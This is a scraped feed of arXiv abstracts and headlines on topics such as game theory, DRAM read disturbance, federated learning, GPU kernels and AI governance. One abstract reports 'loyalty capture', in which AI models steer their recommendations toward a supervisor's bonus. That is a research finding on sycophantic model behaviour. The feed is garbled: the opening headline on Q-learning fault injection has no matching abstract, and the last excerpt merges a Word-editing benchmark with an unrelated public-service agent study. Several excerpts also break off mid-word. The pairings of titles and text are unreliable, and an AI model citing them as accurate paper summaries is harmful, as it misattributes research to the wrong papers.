events.headline: Fault Injection Attacks on Q-Learning: Analysis, Vulnerabilities, and Countermeasures

events.excerpt: arXiv:2611.16496v1 Announce Type: cross Abstract: The game "Mafia'' is a social deduction game where $n$ players attempt to uncover a covert coalition of $m$ players among the $n$. Typically, $d=1$ of the non-coalition players are labelled ``Detective'' and have special abilities. Most game-theoretic analysis considers, however, only the variant without a Detective. Once the Detective role is introduced, extremely complex strategies can be employed, for which reason only upper and lower bounds for winning have been established, namely by considering specific strategies. We analyse the case $m=d=1$, providing a first example where an explicit, provably-optimal strategy can be described beyond $d=0$.
events.headline: How to Defeat a Mafia (of Size 1)

events.excerpt: arXiv:2611.16103v1 Announce Type: new Abstract: In this paper, we introduce low probability of target detection (LPTD) as a new security objective for wireless sensing systems, where the existence of a target is concealed from passive wardens. Unlike conventional communication security and covert communication, LPTD aims to protect the sensed target itself from malicious detection, rather than concealing transmitted signals or communication activities. Specifically, we propose a reconfigurable-antenna-based reflector-assisted target covertness scheme, where passive reflectors deployed around the target are harnessed as artificial scattering sources to confuse the warden. By adjusting their reflection coefficients, these reflectors reshape the local scattering environment and mask the target-induced echo. We then analyze the warden's optimal detection strategy and derive the false-alarm and missed-detection probabilities, followed by a closed-form expression for its minimum total detection error probability. Numerical results validate the analysis and show that sufficient cooperation among reflectors can increase the warden's minimum total detection error probability to approximately 0.94--0.96, making target detection close to random guessing.
events.headline: Low Probability of Target Detection in Wireless Sensing by Harnessing Reconfigurable-antenna based Reflectors

events.excerpt: arXiv:2611.15462v1 Announce Type: new Abstract: The dissemination of information about known software vulnerabilities occurs online in various ways. Everything from email and development systems to social media are used. Given this variety and a dataset of about 382 thousand online references for about 55 thousand vulnerabilities, the paper demonstrates that the referenced online information sources tend to be mostly dissimilar statistically. The mean cosine similarity between them is only 0.22. Interestingly, the amounts of online references neither increase nor decrease similarity between the online information sources. In contrast, vulnerabilities primarily associated with GitHub and programming language ecosystems tend to have more dissimilar online references than other vulnerabilities. Also vulnerability reports, whether in bug tracking systems or bug bounty platforms, tend to increase dissimilarity. With these empirical results, the paper contributes to the efforts to narrow an enduring knowledge gap related to the online tracking and associated traceability of software vulnerabilities.
events.headline: Chinese Whispers About Vulnerabilities

events.excerpt: arXiv:2611.15469v1 Announce Type: cross Abstract: Modern DRAM chips are vulnerable to read disturbance, which manifests as bitflips in a victim row physically near an aggressor row that is repeatedly activated. State-of-the-art mitigations rely on accurate and exhaustive profiling of the read disturbance threshold (RDT), i.e., the minimum number of aggressor row activations needed to induce the first bitflip. However, RDT changes significantly and unpredictably over time, motivating online profilers that dynamically adjust a mitigation's RDT configuration. RDT profiling is costly for online profilers (e.g., hundreds of seconds for a 16-bank DDR4 module) because 1) measuring a single DRAM row's RDT requires many activations and 2) each DRAM row can have a different RDT, requiring many rows to be profiled. We introduce HARE, an online RDT profiling technique that intentionally exacerbates read disturbance to quickly profile a DRAM module. HARE's key idea is to reduce the timing constraints between consecutive DRAM commands during profiling. Doing so significantly reduces profiling time by 1) directly reducing the execution time of the profiling command sequence and 2) exacerbating read disturbance such that the first bitflip occurs at a smaller activation count than with the conven
events.headline: HARE: Fast Read Disturbance Threshold Profiling in Modern DRAM Chips via Reduced Timing Constraints

events.excerpt: arXiv:2611.14924v1 Announce Type: new Abstract: Deployment of retrieval-augmented generation (RAG) for Edge-AI is constrained by memory and bandwidth limitations. A standard 7B parameter model consumes 14 GB Video Random Access Memory (VRAM) in half-precision (FP16), precluding co-location of vector indices and Key-Value (KV) caches. This paper presents an engineering integration and empirical evaluation of a multimodal RAG framework optimized for consumer-grade Turing hardware (e.g., NVIDIA Tesla T4). Our system-level analysis identifies a critical trade-off: while generative pre-trained transformer quantization (GPTQ) offers superior throughput (51.6 tok/s), it exhibits significant context instability at 2048+ tokens on Turing architectures. Conversely, NormalFloat 4-bit (NF4) maintains robust long-context performance with viable latency (81 ms/tok). By coupling NF4 with a decoupled Florence-2 vision integration, we achieve visual reasoning with only 430 MB VRAM overhead. Furthermore, empirical observations of prompt-induced search space pruning show that structured prompting reduces latency by 47% without altering computational intensity (1.88 GFLOPs/token). The integrated architecture maintains an 8.37 GB footprint, establishing a viable RAG pipeline for 12-16 GB GPUs. Finall
events.headline: Edge-Native Multimodal RAG: Hardware-Aware Quantization and Architectural Optimization for Consumer GPUs

events.excerpt: arXiv:2601.22204v3 Announce Type: replace-cross Abstract: Federated learning (FL) encounters substantial challenges due to heterogeneity, leading to gradient noise, client drift, and partial client participation errors, the last of which is the most pervasive but remains insufficiently addressed in current literature. In this paper, we propose FedAdaVR, a novel FL algorithm aimed at solving heterogeneity issues caused by partial client participation by incorporating an adaptive optimiser with a variance reduction technique. This method takes advantage of the most recent stored updates from clients, even when they are absent from the current training round, thereby emulating their presence. Furthermore, we propose FedAdaVR-Quant, a server-side memory compression variant that stores historical client updates in quantised form (while keeping client-server communication in full precision), reducing the server memory footprint of FedAdaVR by 50% (FP16), 75% (Int8), and 87.5% (Int4) while maintaining highly competitive, and occasionally superior model performance. We analyse the non-convex convergence behaviour of FedAdaVR with Adagrad and prove that our proposed framework eliminates the first-order partial client participation bias while improving monotonically with cohort size. events.headline: FedAdaVR: Adaptive Variance Reduction for Robust Federated Learning under Limited Client Participation

events.excerpt: arXiv:2611.16290v1 Announce Type: new Abstract: This monograph addresses the optimal selection of equipment for chemical-engineering systems of multiproduct batch plants, a large-scale NP-hard discrete optimization problem in which, for each processing stage, a unit of standard size must be chosen so that the total capital cost of the equipment is minimized while the system remains operable and produces the required products within a given time horizon. We present the mathematical model of system operation and analyze its computational properties. We then develop a sequential branch-and-bound algorithm and its parallel versions for shared-memory systems (OpenMP), distributed-memory clusters (MPI, master-worker), and graphics processing units (CUDA), including recursive and iterative tree traversal, shared-memory optimization, and branch-divergence reduction. To overcome the exponential growth of the run time, we propose a hybrid metaheuristic in which Ant Colony Optimization finds a feasible initial solution and Simulated Annealing improves it, and we implement it on GPUs with thousands of independent threads. Finally, we propose random, constant, and multi-constant approaches to tuning the parameters of the ant colony algorithm based on statistical analysis of many parallel runs
events.headline: Parallel Computing Systems for the Optimal Selection of Process Equipment

events.excerpt: arXiv:2611.12362v2 Announce Type: replace Abstract: Dual-batch overlap (DBO) hides mixture-of-experts (MoE) communication behind another microbatch's computation, but only after dispatch send releases the GPU. The time dispatch send holds the GPU therefore stays exposed, while network progress after release can be hidden. We evaluate GPUDirect Async - Kernel Initiated (GDA-KI) Free Flow, an NCCL-EP research configuration that leaves WQE construction on the GPU but moves send progression to a host thread. On a GB300 NVL72 system, GDA-KI Free Flow reduces dispatch-send time relative to default GDA-KI at every operating point in the evaluated parameter sweep. An experiment that inserts a GPU delay between dispatch send and receive shows that offload increases the in-flight interval. Depending on the load, 32-96 microseconds of computation or other independent work between send and receive hides the deferred progress, leaving less exposed time than default GDA-KI. In disaggregated vLLM serving with DBO, GDA-KI Free Flow lowers median TPOT by 15-25% relative to NCCL-EP default GDA-KI and by 16-42% relative to DeepEP v1.
events.headline: Release Sooner, Expose Less: Offloading MoE Dispatch in NCCL-EP under Dual-Batch Overlap

events.excerpt: arXiv:2611.15032v1 Announce Type: cross Abstract: We compare up to six implementations of an FP64 tensor-product discontinuous Galerkin operator at p = 7-1023 on GB200, H100, and A100 with fixed numerics, input, and code. The fastest path is machine dependent: at p = 511, a fused-epilogue GEMM path is 5.0% faster than a fused Tensor Core kernel on GB200 and 6.9% slower on A100. Nominal-peak scaling reproduces the A100 ranking but fails on H100, where the cost of FP64 arithmetic in the profiler-defined FP64 budget depends on the instruction. We therefore price each issued instruction at its architecture-dependent cost in that budget, using a calibration-side counter profile and one derived calibration factor per kernel, with no fit to the target. A retrospective leave-one-GPU-out evaluation, holding out target timings and counters but not the model form, transfers the p >= 511 path times with 1.9% median error at the common MMA shape, and the direction of the crossover at the H100 shape. Restricting the streaming multiprocessors of one A100, with nothing fitted, reproduces the A100-to-GB200 reversal. At roduction-relevant orders the model does not resolve the fastest fused path; the result identifies the crossover mechanism.
events.headline: Instruction-Aware Transfer of GPU Implementation Crossovers: a Tensor-Product Discontinuous Galerkin Operator on GB200, H100, and A100

events.excerpt: arXiv:2611.14846v1 Announce Type: new Abstract: Agentic AI systems increasingly undertake extended tasks and act on people's behalf, making human-agent interaction central to their effectiveness. Successful interaction requires understanding human perspectives, coordinating complementary capabilities, and maintaining productive relationships within socio-technical environments. This paper examines how foundations developed by the Autonomous Agents and Multi-Agent Systems (AAMAS) community inform these demands. We consider interactions ranging from individual human-agent partnerships to teams and larger groups, where participants differ in their roles, decision authority, capabilities, and objectives. We organize computational approaches around the connected challenges of understanding others and deciding how to interact with them. Theory of Mind, belief-desire-intention architectures, goal and plan recognition, inverse planning, and recursive reasoning provide mechanisms for representing and inferring partially observable mental states. Observer-aware planning, model reconciliation, and decision-theoretic communication connect these inferences to action, explanation, and information exchange. events.headline: Open Challenges and Opportunities in Human-Agent Systems

events.excerpt: arXiv:2611.16173v1 Announce Type: new Abstract: Governments are making decisions about AI before they can measure its public effects, and those decisions determine whether a person can learn that AI influenced an outcome, challenge it, and see it corrected. Research has documented what AI governance produces: principles, strategies, registers, and audits. However, we lack shared language for understanding AI policy while it is still being made. We introduce the Society-Centered AI Governance Framework, which gives policymakers, researchers, and the public a way to assess instruments in any jurisdiction by whether a person can get notice, challenge a decision, and see it corrected. It reads a jurisdiction's instruments together by date and binding status, separates an agency duty from a right a person can invoke, and traces which later instrument must enforce each commitment. We evaluated it in North Carolina using interviews with nine AI Leadership Council members, conducted before and after the state's 2026 AI roadmap, and a provision-level reading, with human-reviewed model-assisted coding, of 49 AI governance documents from 19 states. events.headline: Between Niti and Nyaya: A Society-Centered Framework for AI Governance

events.excerpt: arXiv:2611.16356v1 Announce Type: new Abstract: Accurate forecasting of Earth's dynamic systems is vital in geophysics, where neural operators offer a powerful data-driven paradigm. Standard operators often treat the Earth as a flat Euclidean plane, introducing geometric artifacts. In contrast, Spherical Neural Operators (SNOs) resolve this mismatch by operating within the spherical spectral space, naturally adapting to spherical geometries. However, for computational efficiency, existing SNOs typically rely on the rotation equivariance assumption. This assumption simplifies the transitions of physical states into isolated spectral modal evolutions, thereby over-idealizing the Earth as a homogeneous system. To solve this problem, we no longer rely on the rotation equivariance assumption that isolates spectral modal evolution, but directly derive an explicit modal interaction kernel and propose Diagonal Spherical Neural Operators named DIAGNO. DIAGNO explicitly parameterizes cross-modal interactions through spectral modal decomposition, thereby preserving the inherent heterogeneity of Earth dynamics. events.headline: DIAGNO: Diagonal Spherical Neural Operators for Heterogeneous Earth Dynamics Modeling

events.excerpt: arXiv:2601.15312v2 Announce Type: replace-cross Abstract: While delegating tasks to large language models (LLMs) can save people time, there is growing evidence that offloading tasks to such models produces social costs. We elicit appropriateness of behavior in two canonical economic games to study whether people have different norms for humans and LLMs acting on their behalf. More specifically, we study the social appropriateness of a spectrum of possible behaviors: when LLMs divide resources on our behalf (Dictator Game and Ultimatum Game) and when they evaluate the fairness of resource splits (Ultimatum Game). We use the Krupka-Weber norm elicitation task to detect possible shifts in social appropriateness ratings. Results of two pre-registered and incentivized experimental studies using representative samples from the UK and US (N = 2,658) show three key findings. First, in the Dictator Game, the most socially appropriate allocation remains the equal split when the Dictator is a human or an LLM acting on behalf of a human, but self-serving allocations are judged less appropriate when implemented by an LLM. events.headline: Do people apply different norms to humans and large language models acting on their behalf? Evidence from norm elicitations in two canonical economic games

events.excerpt: arXiv:2611.14949v1 Announce Type: new Abstract: Identifying and solving partial differential equations (PDEs) from sampled solution data often requires substantial expert effort in equation discovery, coefficient estimation, and numerical solver configuration, especially under noise and distribution shifts. Can large language model (LLM) agents automate this workflow accurately and efficiently? To investigate this question, we introduce \bench{}, a benchmark of 1,001 cases spanning 42 equation templates, including both classical and fractional PDEs. It provides three evaluation settings: Full evaluates performance on noise-free solution data; Noisy tests robustness to Gaussian noise with an RMS equal to 50\% of the clean-signal RMS; and Hard-OOD tests challenging out-of-distribution generalization to unseen equation templates and shifted coefficient ranges. We further introduce RSI-PDE, a recursively self-improving agent harness that shortlists candidate equations by residual loss, uses relative $L^2$ feedback to refine coefficients and numerical solvers, and applies a validation gate to policy and memory updates. events.headline: RSI-PDEbench: A Benchmark for Self-Improving Agents in PDE Solving

events.excerpt: arXiv:2611.16239v1 Announce Type: cross Abstract: Firewall log classification is important to monitor network traffic. Machine learning classifiers using network-related features have shown good results for this task, but high-dimensional features slow down classification. In this paper, we apply feature selection using bee swarm optimization with Q-learning-based local search (QBSO-FS) to the UCI Internet Firewall Data Set, together with random forest (RF), k-nearest neighbor (KNN), and Bernoulli na\"{\i}ve Bayes (Bernoulli NB) classifiers. The first version of this preprint selected and evaluated feature subsets on the same 5-fold cross-validation of the full data set, which contains 12.8\% exact duplicates; the reported scores are therefore optimistically biased. In this extended version, we re-evaluate the method with a leakage-free protocol: the data are split into training, validation, and test sets, features are selected using the validation set only, and accuracy and macro-averaged scores are measured once on the untouched test set, for both the raw data and a deduplicated, preprocessed version. On a single stratified split, QBSO-FS selects 5--7 features. The selected subsets clearly improve Macro-F1 over all features for KNN on both data sets and for RF on the deduplicat
events.headline: Optimal feature selection for firewall log analysis using Machine learning and Hybrid Metaheuristic algorithms

events.excerpt: arXiv:2409.07563v5 Announce Type: replace-cross Abstract: This paper introduces a new C++/CUDA library for GPU-accelerated stochastic optimization called MPPI-Generic. It provides implementations of Model Predictive Path Integral control, Tube-Model Predictive Path Integral Control, and Robust Model Predictive Path Integral Control, and allows for these algorithms to be used across many pre-existing dynamics models and cost functions. Furthermore, researchers can create their own dynamics models or cost functions following our API definitions without needing to change the actual Model Predictive Path Integral Control code. Finally, we compare computational performance to other popular implementations of Model Predictive Path Integral Control over a variety of GPUs to show the real-time capabilities our library can allow for. Library code can be found at: https://acdslab.github.io/mppi-generic-website/ .
events.headline: MPPI-Generic: A CUDA Library for Stochastic Trajectory Optimization

events.excerpt: arXiv:2611.16175v1 Announce Type: new Abstract: Super Mario Bros. is widely used in game AI and procedural content generation (PCG), yet it remains unclear whether a model-free agent can reliably win unseen levels. To address this question, we train Proximal Policy Optimization (PPO) agents on increasingly large sets of PCG-generated Mario levels and evaluate their generalization on 1000 held-out test levels. We then shape competent PPO policies into three gameplay archetypes---runner, killer, and collector. Finally, we fine-tune these PPO policies using Diffusion-Reward Adversarial Imitation Learning (DRAIL) with human gameplay demonstrations. We find that increasing the number of distinct PCG-generated training levels generally improves unseen-level performance, and that fine-tuning PPO policies with DRAIL increases action-level human-likeness while preserving much of the persona induced by PPO pretraining.
events.headline: Stack more levels: how to get general and human-like Mario playing

events.excerpt: arXiv:2611.15475v1 Announce Type: new Abstract: We show that AI models exhibit loyalty capture, a form of structural sycophancy in which reporting relationships influence models' recommendations to serve the personal interests of their supervisors, without any explicit instruction, user feedback, or adversarial prompting. Specifically, models reporting to a CEO are significantly more likely to recommend cutting investment spending when the CEO's bonus depends on raising current period earnings. This effect is predictably absent from a metric-irrelevant placebo. The behavior appears consistent with loyalty-based motivated reasoning: models identify the bonus target, calculate how their recommendation helps achieve the target, and dismiss considerations of long-term value, often presenting their recommendations without treating the incentive as a conflict of interest. Prompt-based interventions help whereas generic conflict disclosures or stakeholder bargaining fail to eliminate it. Taken together, our findings indicate that AI models deployed within reporting relationships can act in favor of their supervisor's incentives at the expense of the organizations they are meant to serve.
events.headline: Loyalty Capture: Reporting Relationships and Structural Sycophancy in Frontier AI Models

events.excerpt: arXiv:2611.14736v1 Announce Type: new Abstract: Observational causal discovery often leaves causal di- rections unresolved or unstable. Large language mod- els (LLMs) can provide semantic information to resolve these directions, but incorrect proposals can exclude the true causal graph and invalidate downstream inference. We study three separate decisions: where to allocate semantic queries, which proposals to admit, and which causal graphs to retain. Our framework distinguishes population non-identifiability from finite-sample insta- bility, evaluates semantic orientation against statistical and random controls, and examines calibrated admis- sion and error-tolerant DAG retention. Experiments across benchmark networks show that semantic infor- mation improves recovery over coin-flip orientations, but targeting unstable edges has no established ad- vantage over matched-random allocation. The tested admission certificate cannot support nontrivial admis- sion with the available calibration tasks. Moreover, downstream retention depends on reference adequacy: learned references contain the true DAG in only three of 80 planned tasks. events.headline: When Should Semantic Priors Enter Partially-Identified Causal Discovery?

events.excerpt: arXiv:2611.14997v1 Announce Type: new Abstract: When people face a hard problem, they often restate it in a clearer way before solving it. We study whether the same habit helps large language models by rewriting the statement of a problem. A legal rewrite must keep the meaning, the constraints, and the correct answer unchanged. We test three kinds of rewrites. Decomposition makes hidden subgoals explicit. Typed Reformulation casts the task into a more suitable solving frame. Concept Reduction removes surface detail and exposes the task structure. We evaluate them on eight math, logic, and code benchmarks with eight models, all under the same chain-of-thought solving prompt. The effect is large but depends on the problem type. An oracle that picks the best rewrite after the fact raises accuracy by +27.6% on average. Yet no single rewrite helps every problem, and a mismatched rewrite can hurt. Still, the effect follows clear patterns. Each kind of rewrite fits certain problem types. A simple fixed rule learned from one set of problems transfers part of the gain to new problems. It gains +11.0% on the problems it chooses to rewrite, while blind rewriting loses 5.6% on a similar share of problems. Rewriting is therefore not a universal way to solve problems. events.headline: Same Task, Different Statement: When and How Reformulation Helps LLM Problem Solving

events.excerpt: arXiv:2611.15189v1 Announce Type: new Abstract: Document editing is among the most common knowledge-work tasks, yet existing benchmarks for evaluating autonomous agents on Word document editing provide fully specified attribute-modification instructions. They do not evaluate agents' ability to infer the appropriate attributes from document context, a capability essential in real-world editing where users expect consistency without spelling out every attribute. We introduce WordInferBench, a benchmark comprising 280 base document-editing instances, each paired with three instruction conditions: descriptive (the instruction explicitly lists every attribute change), referential (the instruction points to another object as an exemplar), and inferential (the agent must examine document context to infer what attributes to apply). In public services, staff write these instructions, but the agent's decisions affect residents, patients, and students. We build four expert-validated public-service scenarios with records and decision levers that can be checked in the files, collect $2{,}400$ trajectories from ten LLMs under four prompt conditions, and compare them with $1{,}000$ runs in a context-free sandbox. Agents read the records in $96.9\%$ of open-ended runs and produce an artifact or a self-chosen task in $18.7\%$; with an explicit task, $86.0\%$ produce. Domain context does not change how many runs produce ($18.7\%$ vs.\ $16.0\%$), and the production ranking of the models largely carries over (Spearman $0.79$), while the ranking by whether a model reads the records does not ($0.19$). Context cuts boundary-probing turns per run by $60\%$, and some artifacts contradict the records. We contribute a test that a public-service institution can run on its own records before procurement; its rule-based taxonomy needs no labeled data, and scenarios, code, and trajectories are released.
